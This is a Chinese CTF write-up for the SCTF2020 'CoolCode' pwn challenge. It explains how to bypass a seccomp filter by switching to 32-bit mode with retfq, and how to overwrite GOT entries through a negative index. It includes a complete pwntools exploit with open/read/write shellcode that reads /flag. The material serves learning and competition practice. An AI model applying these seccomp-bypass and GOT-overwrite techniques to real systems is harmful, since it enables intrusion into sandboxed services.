---
title: 从SCTF2020_CoolCode中学习open禁用的seccomp绕过
tags:
  - binary
  - Writesup
---
## seccomp禁用execve和open的情况

一般会留一个5号系统调用。

```
0004: 0x15 0x01 0x00 0x00000005  if (A == fstat) goto 0006
```

在64位运行模式下的`sys_fstat`，在32位运行模式下是`sys_open`。

解决方案是利用shellcode`retfq`进行模式转换。`retfq`相当于`jmp rsp`的同时`mov cs,[rsp+0x8]`。cs寄存器中0x23表示32位运行模式，0x33表示64位运行模式。在写shellcode的时候在栈中布置好即可。

## 程序分析

文件保护机制

```
$ file ./CoolCode
./CoolCode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=63ae47b78d82eb9066b985cd3daf02452cd65895, stripped
$ checksec ./CoolCode
[*] '/home/surgaer/work/CoolCode'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

几乎只开了canary，疯狂暗示。

但是没有这么简单，直接给了一个`seccomp`，禁用一大堆。只剩了`write`、`read`、`mmap`和`fstat`。

```
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0006
 0002: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0006
 0003: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0006
 0004: 0x15 0x01 0x00 0x00000005  if (A == fstat) goto 0006
 0005: 0x06 0x00 0x00 0x00050005  return ERRNO(5)
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
```

参考师傅们的WP，解决方案是利用retfq切换机器运行模式到32位。

> 32位的系统调用`5 : sys_open`，64位系统调用`5 : sys_fstat`。

向chunk中输入信息时有信息检测，需要是数字或者大写字母。

```c
if ( waf(s, v8) )
  {
    puts("read error.");
    exit(1);
}
strncpy(dest, s, v8);
...
}

signed __int64 __fastcall waf(__int64 a1, int a2)
{
  int i; // [rsp+14h] [rbp-8h]

  for ( i = 0; i < a2 - 1; ++i )
  {
    if ( (*(i + a1) <= 0x2F || *(i + a1) > 0x39) && (*(i + a1) <= 0x40 || *(i + a1) > 0x5A) )
      return 1LL;
  }
  return 0LL;
}
```

而可以利用`add`函数没有下界检测，可以输入负数覆盖`got`表的漏洞进行解决。解决方案是将`exit_got`改成`ret`。从而绕过检测。

```python
add(-22,'\xc3') # asm('ret')
```

再覆盖`free_got`为`shellcode_read`，获得大量的字符输入权。

```python
shellcode2 = '''
dec rdi
mov rdx,rsi
mov rax,rdi
syscall
ret
'''
add(-3,'1'*8)
add(1,'1'*8)
add(-3,'1'*8)
add(1,'1'*8)
add(-3,'1'*8)
add(-34,asm(shellcode2,arch='amd64')) # overwrite free_got
```

这样就可以写任意的字符了，但是由于`strncpy`函数的存在，`"\x00"`还是不行。况且我们并没有足够的字节数进行`shellcode`的写入。解决方案是将`write_got`写成`read`，就可以用`show`函数进行写了。

```python
shellcode2 = '''
dec rdi
mov rdx,rsi
mov rax,rdi
syscall
ret
'''
add(-3,'1'*8)
add(1,'1'*8)
add(-3,'1'*8)
add(1,'1'*8)
add(-3,'1'*8)
add(-34,asm(shellcode2,arch='amd64')) # overwrite write_got
show(0)
```

此时我们只需向两个位置写入`shellcode`，再用`retfq`进行一个跳转即可。


```python
shellcode3 = '''
xor rdi,rdi
mov rsi,0x602300
mov rdx,0x200
xor rax,rax
syscall
xor rdi,rdi
xor rax,rax
mov rsi,0x602400
mov rdx,0x200
syscall
push 0x23
push 0x602308
retfq
'''
padding = 'a'*0x20+p64(0)+p64(0x31)
payload = padding*2+asm(shellcode3,arch='amd64')
io.sendline(payload)
free(2)
flag = '/flag\x00\x00\x00'
shellcode_open = '''
xor eax,eax
mov eax,0x5
mov ebx,0x602300
mov ecx,0
int 0x80
jmp 0x33:0x602400
ret
'''
shellcode_write = '''
mov rdi,3
mov rsi,0x602500
mov rdx,0x200
xor rax,rax
syscall
mov rax,1
mov rdi,1
mov rsi,0x602500
mov rdx,0x200
syscall
ret
'''
io.sendline(flag+asm(shellcode_open,arch='i386'))
io.sendline(asm(shellcode_write,arch='amd64'))
```

### 思路

1.  覆盖`exit_got`成`ret`，获得字符输入权限。
2. 覆盖`free_got`为`shellcode_read`，获得大量的字符输入权。
3. 覆盖`write_got`成`shellcode_read`，获得随机字符随机字符数输入权限。
4. 将`free_got`上的指针所指`chunk`内容覆盖为`shellcode_read`，读入两段`shellcode`并且完成运行模式的转换。
5. 发送`shellcode`，完成`orw`。

### exp

```python
from pwn import *
io = process("./CoolCode")
#io = remote("")
elf = ELF("./CoolCode")
libc = ELF("./x64-libc-2.23.so")
#context.log_level = 'debug'

def add(idx,con):
    io.sendlineafter(" Your choice :",'1')
    io.sendlineafter("Index:",str(idx))
    io.sendafter("messages:",con)

def free(idx):
    io.sendlineafter(" Your choice :",'3')
    io.sendlineafter("Index:",str(idx))

def show(idx):
    io.sendlineafter(" Your choice :",'2')
    io.sendlineafter("Index:",str(idx))

def dbg():
    gdb.attach(io)
    pause()

breakpoint = '''
define fn
b *0x400E61
b *0x400EF5
end
fn
'''
#gdb.attach(io,breakpoint)
add(-22,'\xc3') # asm('ret')
shellcode1 = '''
mov rsi,rdi
mov rdx,rdi
xor rdi,rdi
xor rax,rax
syscall
ret
'''
add(0,'1'*8)
add(-3,'1'*8)
add(-37,asm(shellcode1,arch='amd64')) # overwrite exit_got
shellcode2 = '''
dec rdi
mov rdx,rsi
mov rax,rdi
syscall
ret
'''
add(-3,'1'*8)
add(1,'1'*8)
add(-3,'1'*8)
add(1,'1'*8)
add(-3,'1'*8)
add(-34,asm(shellcode2,arch='amd64')) # overwrite write_got
show(0)
shellcode3 = '''
xor rdi,rdi
mov rsi,0x602300
mov rdx,0x200
xor rax,rax
syscall
xor rdi,rdi
xor rax,rax
mov rsi,0x602400
mov rdx,0x200
syscall
push 0x23
push 0x602308
retfq
'''
padding = 'a'*0x20+p64(0)+p64(0x31)
payload = padding*2+asm(shellcode3,arch='amd64')
io.sendline(payload)
free(2)
flag = '/flag\x00\x00\x00'
shellcode_open = '''
xor eax,eax
mov eax,0x5
mov ebx,0x602300
mov ecx,0
int 0x80
jmp 0x33:0x602400
ret
'''
shellcode_write = '''
mov rdi,3
mov rsi,0x602500
mov rdx,0x200
xor rax,rax
syscall
mov rax,1
mov rdi,1
mov rsi,0x602500
mov rdx,0x200
syscall
ret
'''
io.sendline(flag+asm(shellcode_open,arch='i386'))
#pause()
io.sendline(asm(shellcode_write,arch='amd64'))
io.interactive()
```

参考W&M战队WP

[SCTF2020 Writeup By W&M（PWN和Crypto部分）](http://url.cn/UIeS07hx)

## 总结

一开始这一题没有思路，原因可能是跳过了`checksec`的环节导致`RWX`以及`NX`没有发现，进而无法得到程序的控制流。

其次是`shellcode`的编写。通过这一题对自己的`shellcode`的编写能力有了一定的提升。

最后，在比赛上我总是怂的一批。记住，在比赛时一定不要怂。

![qinaidereaide1](/assets/CoolCode/qinaidereaide1.jpg)
